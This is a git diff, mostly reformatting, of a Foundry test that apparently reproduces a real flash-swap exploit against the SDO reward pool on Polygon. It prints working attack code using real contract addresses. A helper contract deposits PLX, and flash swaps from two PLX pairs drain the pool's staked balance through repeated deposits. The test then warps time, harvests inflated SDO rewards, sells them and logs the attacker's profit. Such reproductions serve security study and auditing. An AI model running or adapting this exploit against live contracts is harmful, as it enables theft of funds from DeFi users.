@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 
@@ -12,17 +12,14 @@ import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // @Analysis
 
 interface SdoRewardPOOL {
-
     function deposit(uint256 _pid, uint256 _amount) external;
     function withdraw(uint256 _pid, uint256 _amount) external;
     function harvestAllRewards() external;
     function updatePool(uint256 _pid) external;
     function pendingReward(uint256, address) external returns (uint256);
-
 }
 
 interface PolydexRouter {
-
     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -30,20 +27,20 @@ interface PolydexRouter {
         address to,
         uint256 deadline
     ) external;
-
 }
 
 contract depositToken {
-
     IERC20 SDO = IERC20(0x86BC05a6f65efdaDa08528Ec66603Aef175D967f);
     IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
     IERC20 PLX = IERC20(0x7A5dc8A09c831251026302C93A778748dd48b4DF);
     IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
-    IUniswapV2Router Router = IUniswapV2Router(payable(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74));
-    SdoRewardPOOL Pool = SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);
+    IUniswapV2Router Router =
+        IUniswapV2Router(payable(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74));
+    SdoRewardPOOL Pool =
+        SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);
 
     function depositPLX() external payable {
-        (bool success,) = address(WMATIC).call{value: 1 ether}("");
+        (bool success, ) = address(WMATIC).call{value: 1 ether}("");
         success;
         address[] memory path = new address[](2);
         path[0] = address(WMATIC);
@@ -51,7 +48,11 @@ contract depositToken {
         WMATIC.approve(address(Router), type(uint256).max);
         PLX.approve(address(Pool), type(uint256).max);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WMATIC.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            WMATIC.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
         Pool.deposit(uint256(9), PLX.balanceOf(address(this)));
     }
@@ -76,20 +77,22 @@ contract depositToken {
             block.timestamp
         );
     }
-
 }
 
 contract ContractTest is Test {
-
     IERC20 SDO = IERC20(0x86BC05a6f65efdaDa08528Ec66603Aef175D967f);
     IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
     IERC20 PLX = IERC20(0x7A5dc8A09c831251026302C93A778748dd48b4DF);
     IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
     IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
-    IUniswapV2Router Router = IUniswapV2Router(payable(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74));
-    SdoRewardPOOL Pool = SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);
-    IUniswapV2Pair Pair1 = IUniswapV2Pair(0xD33992A7367523B04949C7693d6506d4a7e19446); // WETH PLX
-    IUniswapV2Pair Pair2 = IUniswapV2Pair(0x948d4AE4e9Ebf2AC6E787D29B94d0fF440EF2e4D); // WMATIC PLX
+    IUniswapV2Router Router =
+        IUniswapV2Router(payable(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74));
+    SdoRewardPOOL Pool =
+        SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);
+    IUniswapV2Pair Pair1 =
+        IUniswapV2Pair(0xD33992A7367523B04949C7693d6506d4a7e19446); // WETH PLX
+    IUniswapV2Pair Pair2 =
+        IUniswapV2Pair(0x948d4AE4e9Ebf2AC6E787D29B94d0fF440EF2e4D); // WMATIC PLX
     uint256 amounts0;
     uint256 amounts1;
     address addressContract;
@@ -105,14 +108,16 @@ contract ContractTest is Test {
     function testExploit() public payable {
         PLX.approve(address(Pool), type(uint256).max);
         WMATIC.approve(address(Router), type(uint256).max);
-        (reserve0Pair1, reserve1Pair1,) = Pair1.getReserves();
-        (reserve0Pair2, reserve1Pair2,) = Pair2.getReserves();
-        (bool sucess,) = address(WMATIC).call{value: 10_000 ether}("");
+        (reserve0Pair1, reserve1Pair1, ) = Pair1.getReserves();
+        (reserve0Pair2, reserve1Pair2, ) = Pair2.getReserves();
+        (bool sucess, ) = address(WMATIC).call{value: 10_000 ether}("");
         sucess;
 
         // depost PLX
         ContractFactory();
-        (bool success,) = addressContract.call{value: 1 ether}(abi.encodeWithSignature("depositPLX()"));
+        (bool success, ) = addressContract.call{value: 1 ether}(
+            abi.encodeWithSignature("depositPLX()")
+        );
         //revert();
         require(success);
         // change block.timestamp
@@ -123,19 +128,36 @@ contract ContractTest is Test {
         vm.warp(block.timestamp + 5 * 60 * 60 + 1);
         uint256 amountreward = Pool.pendingReward(uint256(9), addressContract);
         amountreward;
-        (bool success1,) = addressContract.call(abi.encodeWithSignature("withdrawPLX()"));
+        (bool success1, ) = addressContract.call(
+            abi.encodeWithSignature("withdrawPLX()")
+        );
         require(success1);
 
-        emit log_named_decimal_uint("Attacker SDO profit after exploit", SDO.balanceOf(addressContract), 18);
+        emit log_named_decimal_uint(
+            "Attacker SDO profit after exploit",
+            SDO.balanceOf(addressContract),
+            18
+        );
 
-        (bool success2,) = addressContract.call(abi.encodeWithSignature("sellSDO()"));
+        (bool success2, ) = addressContract.call(
+            abi.encodeWithSignature("sellSDO()")
+        );
         require(success2);
         WMATIC.balanceOf(address(this));
 
-        emit log_named_decimal_uint("Attacker USDC profit after exploit", USDC.balanceOf(addressContract), 6);
+        emit log_named_decimal_uint(
+            "Attacker USDC profit after exploit",
+            USDC.balanceOf(addressContract),
+            6
+        );
     }
 
-    function polydexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+    function polydexCall(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) public {
         sender;
         amount0;
         amount1;
@@ -145,7 +167,8 @@ contract ContractTest is Test {
             Pair2.swap(0, amounts1, address(this), new bytes(1));
             // flashswap callback pair1
             uint256 amountPLX0 = PLX.balanceOf(address(this));
-            uint256 amountBuy = ((((amounts0 - amountPLX0) * 1011) / 1000) * 1000) / 995;
+            uint256 amountBuy = ((((amounts0 - amountPLX0) * 1011) / 1000) *
+                1000) / 995;
             buyPLX(amountBuy);
             PLX.transfer(address(Pair1), PLX.balanceOf(address(this)));
             // exploiter repay WETH to pair, but i dont konw how get weth on ploygon, weth-wmatic lack of liquidity ,i choose to repay plx
@@ -161,7 +184,10 @@ contract ContractTest is Test {
             //reduced lptoken
             while (PLX.balanceOf(address(Pool)) > 100) {
                 uint256 amount = PLX.balanceOf(address(this));
-                if ((PLX.balanceOf(address(this)) * 5) / 1000 > PLX.balanceOf(address(Pool))) {
+                if (
+                    (PLX.balanceOf(address(this)) * 5) / 1000 >
+                    PLX.balanceOf(address(Pool))
+                ) {
                     amount = (PLX.balanceOf(address(Pool)) * 1000) / 5;
                 }
                 Pool.deposit(uint256(9), amount);
@@ -186,7 +212,12 @@ contract ContractTest is Test {
         address[] memory path = new address[](2);
         path[0] = address(WMATIC);
         path[1] = address(PLX);
-        Router.swapTokensForExactTokens(amount, WMATIC.balanceOf(address(this)), path, address(this), block.timestamp);
+        Router.swapTokensForExactTokens(
+            amount,
+            WMATIC.balanceOf(address(this)),
+            path,
+            address(this),
+            block.timestamp
+        );
     }
-
 }
